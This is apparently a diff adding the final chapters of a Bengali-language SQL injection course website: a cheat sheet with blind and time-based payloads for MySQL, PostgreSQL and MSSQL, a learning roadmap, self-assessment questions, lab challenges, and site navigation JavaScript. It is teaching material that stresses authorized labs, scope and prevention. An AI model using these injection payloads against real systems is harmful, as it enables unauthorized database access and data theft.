+  <h2>Blind Testing Quick Reference</h2>
+  <div class="codeblock"><pre><code>SUBSTRING((SELECT x),1,1)='a'
+ASCII(SUBSTRING((SELECT x),1,1))>100</code></pre></div>
+
+  <h2>Timing Tests</h2>
+  <table>
+    <thead><tr><th>DBMS</th><th>Payload</th></tr></thead>
+    <tbody>
+      <tr><td>MySQL</td><td><code>IF(cond,SLEEP(5),0)</code></td></tr>
+      <tr><td>PostgreSQL</td><td><code>CASE WHEN cond THEN pg_sleep(5) ELSE pg_sleep(0) END</code></td></tr>
+      <tr><td>MSSQL</td><td><code>IF cond WAITFOR DELAY '0:0:5'</code></td></tr>
+    </tbody>
+  </table>
+
+  <h2>Encoding Concepts</h2>
+  <ul>
+    <li>URL encode: <code>'</code> → <code>%27</code>, স্পেস → <code>%20</code>/<code>+</code>, <code>#</code> → <code>%23</code></li>
+    <li>Hex string literal (MySQL): <code>0x61</code> = <code>'a'</code></li>
+  </ul>
+
+  <h2>Common Troubleshooting</h2>
+  <table>
+    <thead><tr><th>লক্ষণ</th><th>সম্ভাব্য কারণ</th></tr></thead>
+    <tbody>
+      <tr><td>কোনো পার্থক্য নেই</td><td>Parameter ignored, বা ইতিমধ্যে parameterized</td></tr>
+      <tr><td>সব request-এ error</td><td>WAF/rate-limit, বেসলাইনও পুনরায় যাচাই করুন</td></tr>
+      <tr><td>অসামঞ্জস্যপূর্ণ ফলাফল</td><td>Caching বা dynamic content — অধ্যায় ১৮ দেখুন</td></tr>
+    </tbody>
+  </table>
+
+  <h2>Defensive Code Pattern (দ্রুত স্মরণ)</h2>
+  <div class="codeblock"><pre><code>// নিরাপদ প্যাটার্ন — সব ভাষায় একই নীতি
+query = "SELECT ... WHERE col = ?"
+execute(query, [userInput])   // placeholder + আলাদা values array</code></pre></div>
+
+  <div class="summary-box"><h4>সারসংক্ষেপ</h4><p>এই cheat sheet দ্রুত স্মরণের জন্য — গভীর ব্যাখ্যার জন্য সংশ্লিষ্ট অধ্যায়ে ফিরে যান (অধ্যায় ০৩, ০৫, ০৮, ১৭)।</p></div>
+
+  <div class="pager">
+    <a class="prev" href="/chapter20"><span>পূর্ববর্তী</span>অধ্যায় ২০</a>
+    <a class="next" href="/chapter22"><span>পরবর্তী</span>অধ্যায় ২২ — Learning Roadmap ও Assessment</a>
+  </div>
+</section>
+
+<section class="chapter" id="ch22">
+  <div class="eyebrow">অধ্যায় ২২ · রেফারেন্স</div>
+  <h1>Learning Roadmap ও Assessment</h1>
+  <p class="sub">Beginner থেকে advanced হওয়ার পথ, দৈনিক practice plan, এবং সম্পূর্ণ self-assessment (৫০+২৫+১৫ প্রশ্ন, answer key সহ)।</p>
+  <div class="mark-done-row"><input type="checkbox" data-ch="ch22" id="done-ch22"><label for="done-ch22">এই অধ্যায় সম্পন্ন হিসেবে চিহ্নিত করুন</label></div>
+
+  <h2>Beginner থেকে Advanced Learning Order</h2>
+  <ol>
+    <li>অধ্যায় ০১–০২: SQL ও SQLi fundamentals</li>
+    <li>অধ্যায় ০৩: প্রধান ধরনগুলো (error, UNION, blind)</li>
+    <li>অধ্যায় ০৬–০৭: manual methodology ও Burp Suite</li>
+    <li>অধ্যায় ০৪–০৫: কোথায় টেস্ট করতে হয়, payload handbook</li>
+    <li>অধ্যায় ০৮–১১: fingerprinting ও গভীর টেকনিক</li>
+    <li>অধ্যায় ১৭–১৮: prevention ও false-positive handling (সবসময় প্রাসঙ্গিক, তাড়াতাড়ি পড়া ভালো)</li>
+    <li>অধ্যায় ১২–১৬: WAF, business logic, API, automation, impact</li>
+    <li>অধ্যায় ১৯–২২: reporting, labs, cheat sheet, assessment</li>
+  </ol>
+
+  <h2>প্রয়োজনীয় SQL Fundamentals (Checklist)</h2>
+  <div class="card"><ul>
+    <li>☐ SELECT/WHERE/ORDER BY/JOIN লিখতে ও পড়তে পারেন</li>
+    <li>☐ Primary/foreign key বোঝেন</li>
+    <li>☐ String বনাম numeric data type-এর পার্থক্য বোঝেন</li>
+    <li>☐ Parameterized query কী তা ব্যাখ্যা করতে পারেন</li>
+  </ul></div>
+
+  <h2>দৈনিক Practice Plan (নমুনা, ৪ সপ্তাহ)</h2>
+  <table>
+    <thead><tr><th>সপ্তাহ</th><th>ফোকাস</th><th>দৈনিক সময়</th></tr></thead>
+    <tbody>
+      <tr><td>১</td><td>SQL fundamentals + অধ্যায় ০১–০৩</td><td>৪৫–৬০ মিনিট</td></tr>
+      <tr><td>২</td><td>Burp Suite + manual methodology + beginner labs</td><td>৬০ মিনিট</td></tr>
+      <tr><td>৩</td><td>Blind/UNION গভীর practice + intermediate labs</td><td>৬০–৯০ মিনিট</td></tr>
+      <tr><td>৪</td><td>Prevention, reporting, advanced lab, mock assessment</td><td>৬০ মিনিট</td></tr>
+    </tbody>
+  </table>
+  <h3>Weekly Milestone</h3>
+  <ul>
+    <li><strong>সপ্তাহ ১ শেষে:</strong> নিজে একটি vulnerable query লিখে ব্যাখ্যা করতে পারা।</li>
+    <li><strong>সপ্তাহ ২ শেষে:</strong> Burp দিয়ে স্বাধীনভাবে একটি lab endpoint-এ baseline/test তুলনা করতে পারা।</li>
+    <li><strong>সপ্তাহ ৩ শেষে:</strong> PortSwigger-এর অন্তত ৩টি SQLi lab সম্পূর্ণ করা।</li>
+    <li><strong>সপ্তাহ ৪ শেষে:</strong> একটি সম্পূর্ণ ফরম্যাটে (অধ্যায় ১৯) একটি practice রিপোর্ট লেখা।</li>
+  </ul>
+
+  <h2>৫০টি Conceptual Question</h2>
+  <ol>
+    <li>Database ও table-এর মধ্যে পার্থক্য কী?</li>
+    <li>Primary key ও foreign key-এর সংজ্ঞা দিন।</li>
+    <li>String ও integer value quote ব্যবহারে কীভাবে আলাদা?</li>
+    <li>SQL Injection-এর সংজ্ঞা দিন।</li>
+    <li>SQLi-এর মূল root cause কী?</li>
+    <li>Query context বলতে কী বোঝায়?</li>
+    <li>String context ও numeric context-এর মধ্যে পার্থক্য কী?</li>
+    <li>SQLi ও XSS-এর মূল পার্থক্য কী?</li>
+    <li>SQLi ও IDOR-এর মূল পার্থক্য কী?</li>
+    <li>Error-based SQLi কী?</li>
+    <li>UNION-based SQLi-তে column count কেন গুরুত্বপূর্ণ?</li>
+    <li>NULL কেন UNION alignment-এ ব্যবহৃত হয়?</li>
+    <li>Boolean-based blind SQLi কীভাবে কাজ করে?</li>
+    <li>Time-based blind SQLi কখন ব্যবহার করা হয়?</li>
+    <li>Stacked queries কী?</li>
+    <li>সব database-এ stacked queries সমর্থিত কি না?</li>
+    <li>Second-order SQLi কী?</li>
+    <li>In-band ও out-of-band SQLi-এর পার্থক্য কী?</li>
+    <li>Content-based inference কী?</li>
+    <li>ORDER BY injection কেন ভিন্ন ধরনের payload দাবি করে?</li>
+    <li>Parameterized query কীভাবে কাজ করে?</li>
+    <li>Parameterized query দিয়ে কী সুরক্ষিত হয় না?</li>
+    <li>ORM ব্যবহার করলেও কেন SQLi সম্ভব?</li>
+    <li>Stored procedure কি নিজে থেকেই নিরাপদ?</li>
+    <li>Least-privilege database account কী?</li>
+    <li>Allowlist ও denylist-এর পার্থক্য কী?</li>
+    <li>WAF কী এবং এটি কীভাবে কাজ করে?</li>
+    <li>WAF কেন primary defense হতে পারে না?</li>
+    <li>Database fingerprinting কেন গুরুত্বপূর্ণ?</li>
+    <li>MySQL ও PostgreSQL-এ string concatenation সিনট্যাক্স কী?</li>
+    <li>Oracle-এ কেন <code>FROM dual</code> প্রয়োজন?</li>
+    <li>CVSS কী?</li>
+    <li>Blast radius বলতে কী বোঝায়?</li>
+    <li>SQLi-এর confidentiality impact কী?</li>
+    <li>SQLi-এর integrity impact কী?</li>
+    <li>SQLi-এর availability impact কী?</li>
+    <li>Mass assignment ও SQLi-এর পার্থক্য কী?</li>
+    <li>GraphQL-এ SQLi কীভাবে ঘটতে পারে?</li>
+    <li>False positive বলতে কী বোঝায়?</li>
+    <li>Repeatability test কেন গুরুত্বপূর্ণ?</li>
+    <li>Confidence level নির্ধারণের মাপকাঠি কী?</li>
+    <li>Safe proof-of-concept-এর মূলনীতি কী?</li>
+    <li>কেন পুরো ডেটাবেস ডাম্প করা অপ্রয়োজনীয়?</li>
+    <li>SQLMap কী?</li>
+    <li>Automated scanner-এর সীমাবদ্ধতা কী?</li>
+    <li>একটি ভালো bug bounty রিপোর্টের মূল উপাদান কী কী?</li>
+    <li>Severity justification-এ কী অন্তর্ভুক্ত থাকা উচিত?</li>
+    <li>Error suppression হলে কোন কৌশলে স্থানান্তরিত হতে হয়?</li>
+    <li>Type error কীভাবে error-based SQLi-তে ব্যবহার করা যায়?</li>
+    <li>Parser differential ধারণাটি কী?</li>
+    <li>Defense-in-depth বলতে কী বোঝায় SQLi প্রতিরোধে?</li>
+  </ol>
+  <details><summary>Conceptual প্রশ্নের Answer Key (সংক্ষিপ্ত)</summary><div class="inner">
+    <p>এই প্রশ্নগুলোর বিস্তারিত উত্তর সংশ্লিষ্ট অধ্যায়ে পাওয়া যাবে: ১–৩ → অধ্যায় ০১; ৪–২০ → অধ্যায় ০২–০৩; ২১–২৬ → অধ্যায় ১৭; ২৭–৩০ → অধ্যায় ১২, ০৮; ৩১–৩৬ → অধ্যায় ১৬; ৩৭–৩৮ → অধ্যায় ১৪; ৩৯–৪২ → অধ্যায় ১৮; ৪৩–৪৬ → অধ্যায় ১৫, ১৯; ৪৭–৫০ → অধ্যায় ০৯, ১২, ১৭। প্রতিটি প্রশ্নের নির্দিষ্ট, বিস্তারিত উত্তর সেই অধ্যায়ের মূল টেক্সটে ব্যাখ্যা করা আছে — সংক্ষিপ্ত এক-লাইন উত্তর মুখস্থ করার বদলে মূল অধ্যায়ে ফিরে গিয়ে ব্যাখ্যাসহ উত্তর পুনর্গঠন করার অভ্যাস করুন।</p>
+  </div></details>
+
+  <h2>২৫টি Scenario-Based Question</h2>
+  <ol>
+    <li>একটি লগইন ফর্মে username ফিল্ডে quote পাঠালে ৫০০ error আসে, কিন্তু error message-এ কোনো SQL keyword নেই — এটি কি নিশ্চিত SQLi? কেন/কেন না?</li>
+    <li>একটি সার্চ বক্সে <code>AND 1=1</code> ও <code>AND 1=2</code>-এর response একই — পরবর্তী ধাপ কী হওয়া উচিত?</li>
+    <li>একটি API endpoint JSON body গ্রহণ করে, কিন্তু WAF শুধু ফর্ম-এনকোডেড ডেটা পরীক্ষা করে — এখানে ঝুঁকি কী?</li>
+    <li>একটি প্রোফাইল আপডেট ফর্মে payload সংরক্ষণ করার পর সরাসরি কোনো প্রভাব দেখা যায় না — এটি কি নিরাপদ বলে ধরে নেওয়া উচিত?</li>
+    <li>একটি endpoint stacked query সমর্থন করে বলে মনে হচ্ছে — পরবর্তী পদক্ষেপ কী হওয়া উচিত, এবং কী করা উচিত নয়?</li>
+    <li>Time-based payload-এ একবার ৫ সেকেন্ড দেরি দেখা গেছে, কিন্তু দ্বিতীয়বার দেখা যায়নি — সিদ্ধান্ত কী হবে?</li>
+    <li>একটি e-commerce অ্যাপ্লিকেশনে coupon কোড ফিল্ড string context-এ ব্যবহৃত হচ্ছে বলে সন্দেহ — কীভাবে hypothesis টেস্ট করবেন?</li>
+    <li>একটি রিপোর্ট জেনারেশন ফিচার শুধু admin-দের জন্য উপলব্ধ, কিন্তু আপনার কাছে শুধু customer অ্যাকাউন্ট আছে — আপনি কী করবেন?</li>
+    <li>একটি UNION-based payload-এ column count ভুল অনুমান করায় error এসেছে — এটি কি vulnerability না থাকার প্রমাণ?</li>
+    <li>MSSQL ব্যবহার হচ্ছে বলে সন্দেহ, কিন্তু MySQL-নির্দিষ্ট <code>SLEEP()</code> payload কাজ করছে না — পরবর্তী পদক্ষেপ কী?</li>
+    <li>একটি endpoint প্রতিটি request-এ ভিন্ন response length দেখাচ্ছে, এমনকি বেসলাইনেও — কীভাবে এগোবেন?</li>
+    <li>একটি GraphQL resolver-এ <code>Int</code> টাইপ আর্গুমেন্টে string payload পাঠালে validation error আসছে — এটি কী নির্দেশ করে?</li>
+    <li>একটি multi-step checkout-এ ধাপ ১-এর ডেটা ধাপ ৩-এ কোথায় ব্যবহৃত হচ্ছে তা অস্পষ্ট — কীভাবে ম্যাপ করবেন?</li>
+    <li>একটি bug bounty প্রোগ্রাম rate-limit নির্দিষ্ট করেছে — SQLMap ব্যবহার করতে চাইলে কোন ফ্ল্যাগ প্রাসঙ্গিক?</li>
+    <li>Error message-এ "ORA-00933" দেখা গেছে — এটি কোন DBMS নির্দেশ করে এবং পরবর্তী payload কেমন হওয়া উচিত?</li>
+    <li>একটি injectable endpoint পাওয়া গেছে, এবং database account-এর DROP privilege আছে বলে সন্দেহ — আপনি কী করবেন (এবং কী করবেন না)?</li>
+    <li>একটি রিপোর্টে আপনি পুরো users টেবিল ডাম্প করে প্রমাণ দিয়েছেন — এটি কি উপযুক্ত অভ্যাস?</li>
+    <li>একটি endpoint-এ cookie মান ডেটাবেস লগিং-এ ব্যবহৃত হচ্ছে বলে সন্দেহ — কীভাবে hypothesis যাচাই করবেন?</li>
+    <li>একটি প্যারামিটার পরিবর্তন করলেও response কখনোই পরিবর্তন হয় না — সম্ভাব্য কারণ কী কী?</li>
+    <li>একটি API error হিসেবে শুধু <code>{"error": "Bad Request"}</code> ফেরত দেয় — error-based কৌশল কি সরাসরি প্রযোজ্য?</li>
+    <li>একটি লগইন ফর্মে <code>' OR '1'='1</code> কাজ করেনি, কিন্তু timing পার্থক্য পাওয়া গেছে — এর অর্থ কী হতে পারে?</li>
+    <li>একটি endpoint-এ WAF ব্লক করছে, কিন্তু আপনি শুধু defensive research করছেন, exploitation নয় — আপনার পরবর্তী, নৈতিক পদক্ষেপ কী?</li>
+    <li>একটি প্রোডাক্ট ফিল্টার endpoint দামের রেঞ্জে ঋণাত্মক মান গ্রহণ করছে — এটি কি SQLi, নাকি অন্য কিছু?</li>
+    <li>আপনি একটি scope-এর বাইরের subdomain-এ সম্ভাব্য vulnerability খুঁজে পেয়েছেন — আপনার কী করা উচিত?</li>
+    <li>একটি রিপোর্ট জমা দেওয়ার আগে আপনি নিশ্চিত নন যে ফলাফল পুনরুৎপাদনযোগ্য — আপনার কী করা উচিত?</li>
+  </ol>
+
+  <h2>১৫টি Practical Lab Challenge</h2>
+  <ol>
+    <li>একটি lab অ্যাপে একটি single-quote probe দিয়ে injectable parameter শনাক্ত করুন।</li>
+    <li>একটি boolean-based blind SQLi নিশ্চিত করুন এবং একটি সারণীর নাম বের করুন।</li>
+    <li>একটি time-based blind SQLi দিয়ে database version বের করুন।</li>
+    <li>UNION-based কৌশলে column count বের করে একটি marker স্ট্রিং দেখান।</li>
+    <li>একটি error-based payload দিয়ে database name বের করুন।</li>
+    <li>একটি JSON API endpoint-এ SQLi parameter শনাক্ত করুন।</li>
+    <li>একটি second-order SQLi সিনারিও তৈরি করে ডেটা-প্রবাহ ম্যাপ করুন।</li>
+    <li>একটি ORDER BY clause-ভিত্তিক injection শনাক্ত করুন।</li>
+    <li>একটি lab-এ দুইটি ভিন্ন DBMS fingerprint করে পার্থক্য নথিভুক্ত করুন।</li>
+    <li>একটি vulnerable কোড নমুনা parameterized query-তে রূপান্তর করুন (পছন্দের ভাষায়)।</li>
+    <li>একটি dynamic ORDER BY ফিচারের জন্য allowlist প্যাটার্ন লিখুন।</li>
+    <li>একটি false-positive সিনারিও তৈরি করে এবং সঠিকভাবে বাতিল করে দেখান।</li>
+    <li>SQLMap ব্যবহার করে (authorized lab-এ) একটি পূর্বে manually নিশ্চিত হওয়া injection পুনরায় confirm করুন।</li>
+    <li>অধ্যায় ১৯-এর টেমপ্লেট অনুসরণ করে একটি সম্পূর্ণ practice রিপোর্ট লিখুন।</li>
+    <li>একটি সম্পূর্ণ লগইন ফর্মের জন্য vulnerable ও fixed কোড উভয়ই লিখে, ফিক্সের ব্যাখ্যা দিন।</li>
+  </ol>
+
+  <h2>Self-Assessment Scorecard</h2>
+  <table>
+    <thead><tr><th>ক্ষেত্র</th><th>দুর্বল (১)</th><th>মাঝারি (২)</th><th>দক্ষ (৩)</th><th>আপনার স্কোর</th></tr></thead>
+    <tbody>
+      <tr><td>SQL fundamentals</td><td>Query পড়তে পারি না</td><td>সাধারণ SELECT বুঝি</td><td>JOIN/subquery লিখতে পারি</td><td>___</td></tr>
+      <tr><td>SQLi শনাক্তকরণ</td><td>শুধু quote probe জানি</td><td>boolean/error নিশ্চিত করতে পারি</td><td>blind+timing+second-order ধরতে পারি</td><td>___</td></tr>
+      <tr><td>Exploitation</td><td>শুধু তত্ত্ব জানি</td><td>UNION দিয়ে ডেটা বের করতে পারি</td><td>DBMS-নির্দিষ্ট কৌশল প্রয়োগ করতে পারি</td><td>___</td></tr>
+      <tr><td>Prevention</td><td>parameterized query শব্দটি জানি</td><td>একটি ভাষায় ফিক্স লিখতে পারি</td><td>একাধিক ভাষায় + allowlist + least-privilege ব্যাখ্যা করতে পারি</td><td>___</td></tr>
+      <tr><td>Reporting</td><td>কাঠামো জানি না</td><td>টেমপ্লেট অনুসরণ করতে পারি</td><td>severity justification সহ পূর্ণ রিপোর্ট লিখতে পারি</td><td>___</td></tr>
+    </tbody>
+  </table>
+  <p>মোট স্কোর ৫–৭ হলে Beginner স্তরে আরও সময় দিন; ৮–১১ হলে Intermediate অনুশীলনে ফোকাস করুন; ১২–১৫ হলে আপনি Advanced labs ও সত্যিকারের bug bounty প্র্যাকটিসের জন্য প্রস্তুত।</p>
+
+  <div class="summary-box"><h4>এই ডকুমেন্টেশনের শেষে</h4><p>আপনি SQL fundamentals থেকে শুরু করে ২২টি অধ্যায় জুড়ে SQL Injection-এর fundamentals, সব প্রধান ধরন, manual testing methodology, prevention, এবং professional reporting শিখেছেন। পরবর্তী ধাপ: PortSwigger Web Security Academy ও OWASP Juice Shop-এ নিয়মিত, নৈতিক practice চালিয়ে যান।</p></div>
+
+  <div class="pager">
+    <a class="prev" href="/chapter21"><span>পূর্ববর্তী</span>অধ্যায় ২১</a>
+    <span></span>
+  </div>
+</section></div>
+  </div>
+</div>
+
+<script>
+/* ===================== Chapter registry ===================== */
+const CHAPTERS = [
+ {id:"ch00", num:"", title:"ভূমিকা", group:"শুরু করুন", stub:false},
+ {id:"ch01", num:"০১", title:"SQL ও Database Fundamentals", group:"ভিত্তি", stub:false},
+ {id:"ch02", num:"০২", title:"SQL Injection Fundamentals", group:"ভিত্তি", stub:false},
+ {id:"ch03", num:"০৩", title:"SQLi-এর প্রধান ধরন", group:"ভিত্তি", stub:false},
+ {id:"ch04", num:"০৪", title:"কোথায় Test করতে হয়", group:"টেস্টিং", stub:false},
+ {id:"ch05", num:"০৫", title:"Payload Handbook", group:"টেস্টিং", stub:false},
+ {id:"ch06", num:"০৬", title:"Manual Testing Methodology", group:"টেস্টিং", stub:false},
+ {id:"ch07", num:"০৭", title:"Burp Suite দিয়ে SQLi Testing", group:"টেস্টিং", stub:false},
+ {id:"ch08", num:"০৮", title:"Database Fingerprinting", group:"টেস্টিং", stub:false},
+ {id:"ch09", num:"০৯", title:"Error-Based SQLi (বিস্তারিত)", group:"টেকনিক", stub:false},
+ {id:"ch10", num:"১০", title:"UNION-Based SQLi (বিস্তারিত)", group:"টেকনিক", stub:false},
+ {id:"ch11", num:"১১", title:"Blind SQL Injection (বিস্তারিত)", group:"টেকনিক", stub:false},
+ {id:"ch12", num:"১২", title:"WAF ও Filter Bypass", group:"টেকনিক", stub:false},
+ {id:"ch13", num:"১৩", title:"Authentication ও Business Logic", group:"অ্যাডভান্সড", stub:false},
+ {id:"ch14", num:"১৪", title:"API SQL Injection", group:"অ্যাডভান্সড", stub:false},
+ {id:"ch15", num:"১৫", title:"SQLi Automation ও Tooling", group:"অ্যাডভান্সড", stub:false},
+ {id:"ch16", num:"১৬", title:"SQL Injection Impact", group:"অ্যাডভান্সড", stub:false},
+ {id:"ch17", num:"১৭", title:"SQL Injection Prevention", group:"প্রতিরক্ষা", stub:false},
+ {id:"ch18", num:"১৮", title:"False Positives ও Troubleshooting", group:"প্রতিরক্ষা", stub:false},
+ {id:"ch19", num:"১৯", title:"Bug Bounty Reporting", group:"রিপোর্টিং", stub:false},
+ {id:"ch20", num:"২০", title:"Practical Labs ও Exercises", group:"রিপোর্টিং", stub:false},
+ {id:"ch21", num:"২১", title:"SQLi Cheat Sheet", group:"রেফারেন্স", stub:false},
+ {id:"ch22", num:"২২", title:"Learning Roadmap ও Assessment", group:"রেফারেন্স", stub:false},
+];
+
+/* ===================== Build sidebar ===================== */
+const tocEl = document.getElementById('toc');
+let lastGroup = null;
+CHAPTERS.forEach(ch=>{
+  if(ch.group!==lastGroup){
+    const label=document.createElement('li');
+    label.className='part-label';
+    label.textContent=ch.group;
+    tocEl.appendChild(label);
+    lastGroup=ch.group;
+  }
+  const li=document.createElement('li');
+  const a=document.createElement('a');
+  a.href=idToPath(ch.id);
+  a.dataset.id=ch.id;
+  if(ch.stub) a.classList.add('stub');
+  a.innerHTML='<span class="chk">✓</span><span class="num">'+ch.num+'</span><span class="t">'+ch.title+'</span>';
+  li.appendChild(a);
+  tocEl.appendChild(li);
+});
+
+/* ===================== Theme ===================== */
+const root=document.documentElement;
+function applyTheme(t){ if(t) root.setAttribute('data-theme',t); else root.removeAttribute('data-theme'); }
+try{ applyTheme(localStorage.getItem('sqli_theme')); }catch(e){}
+document.getElementById('themeBtn').addEventListener('click',()=>{
+  const cur = root.getAttribute('data-theme') || (matchMedia('(prefers-color-scheme: dark)').matches?'dark':'light');
+  const next = cur==='dark' ? 'light' : 'dark';
+  applyTheme(next);
+  try{ localStorage.setItem('sqli_theme',next); }catch(e){}
+});
+
+/* ===================== Mobile drawer ===================== */
+const sidebar=document.getElementById('sidebar'), scrim=document.getElementById('scrim');
+document.getElementById('menuBtn').addEventListener('click',()=>{ sidebar.classList.add('open'); scrim.classList.add('show'); });
+scrim.addEventListener('click',()=>{ sidebar.classList.remove('open'); scrim.classList.remove('show'); });
+
+/* ===================== Progress tracking ===================== */
+function getDone(){ try{ return JSON.parse(localStorage.getItem('sqli_done')||'{}'); }catch(e){ return {}; } }
+function setDone(obj){ try{ localStorage.setItem('sqli_done',JSON.stringify(obj)); }catch(e){} }
+function refreshProgress(){
+  const done=getDone();
+  const total = CHAPTERS.filter(c=>!c.stub && c.id!=='ch00').length;
+  let count=0;
+  CHAPTERS.forEach(c=>{
+    const a=tocEl.querySelector('a[data-id="'+c.id+'"]');
+    if(done[c.id]){ a.classList.add('done'); if(!c.stub && c.id!=='ch00') count++; } else { a.classList.remove('done'); }
+  });
+  const pct= total? Math.round(count/total*100):0;
+  document.getElementById('progressFill').style.width=pct+'%';
+  document.getElementById('progressText').textContent=count+'/'+total+' অধ্যায় সম্পন্ন';
+}
+refreshProgress();
+document.getElementById('content').addEventListener('change',e=>{
+  if(e.target.matches('.mark-done-row input')){
+    const done=getDone();
+    done[e.target.dataset.ch]=e.target.checked;
+    setDone(done);
+    refreshProgress();
+  }
+});
+
+/* ===================== Search ===================== */
+document.getElementById('searchInput').addEventListener('input',e=>{
+  const q=e.target.value.trim().toLowerCase();
+  tocEl.querySelectorAll('a').forEach(a=>{
+    const txt=a.textContent.toLowerCase();
+    a.classList.toggle('hidden-by-search', q && !txt.includes(q));
+  });
+});
+
+/* ===================== Routing (clean paths, e.g. /chapter02) ===================== */
+function idToPath(id){ return id==='ch00' ? '/' : '/chapter'+id.slice(2); }
+function pathToId(path){
+  const p = path.replace(/\/+$/,'') || '/';
+  if(p==='/'||p==='') return 'ch00';
+  const m = p.match(/chapter(\d{2})/);
+  return m ? 'ch'+m[1] : 'ch00';
+}
+function show(id, push){
+  if(!document.getElementById(id)) id='ch00';
+  document.querySelectorAll('.chapter').forEach(s=>s.classList.toggle('active', s.id===id));
+  tocEl.querySelectorAll('a').forEach(a=>a.classList.toggle('active', a.dataset.id===id));
+  const meta = CHAPTERS.find(c=>c.id===id);
+  document.getElementById('topTitle').textContent = meta? (meta.num? meta.num+'. '+meta.title : meta.title):'';
+  sidebar.classList.remove('open'); scrim.classList.remove('show');
+  document.getElementById('content').scrollIntoView({block:'start'});
+  window.scrollTo(0,0);
+  const path = idToPath(id);
+  if(push && location.pathname !== path){
+    history.pushState({id}, '', path);
+  }
+}
+window.addEventListener('popstate',()=> show(pathToId(location.pathname)));
+document.addEventListener('click', e=>{
+  const a = e.target.closest('a[href^="/"]');
+  if(!a) return;
+  if(a.target==='_blank' || a.hasAttribute('download')) return;
+  const url = new URL(a.href, location.origin);
+  if(url.origin !== location.origin) return;
+  e.preventDefault();
+  show(pathToId(url.pathname), true);
+});
+
+/* ===================== Copy-code buttons ===================== */
+document.querySelectorAll('.codeblock').forEach(cb=>{
+  const btn=cb.querySelector('.copy-btn');
+  const code=cb.querySelector('pre');
+  if(!btn||!code) return;
+  btn.addEventListener('click',async ()=>{
+    const text=code.innerText;
+    try{ await navigator.clipboard.writeText(text); btn.textContent='কপি হয়েছে ✓'; }
+    catch(e){
+      try{
+        const range=document.createRange(); range.selectNode(code);
+        const sel=window.getSelection(); sel.removeAllRanges(); sel.addRange(range);
+      }catch(e2){}
+      btn.textContent='সিলেক্ট হয়েছে';
+    }
+    setTimeout(()=>btn.textContent='কপি',1500);
+  });
+});
+
+/* ===================== Print button ===================== */
+document.getElementById('printBtn').addEventListener('click',()=>{
+  document.querySelectorAll('.chapter').forEach(s=>s.style.display='block');
+  window.print();
+  setTimeout(()=>{ document.querySelectorAll('.chapter').forEach(s=>s.style.display=''); show(pathToId(location.pathname)); },300);
+});
+
+show(pathToId(location.pathname));
+</script>
+
+</body></html>
